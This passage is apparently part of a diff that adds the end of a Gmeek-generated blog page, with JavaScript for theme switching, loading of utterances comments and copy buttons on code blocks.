1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","Mon3t4r/Mon3t4r.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
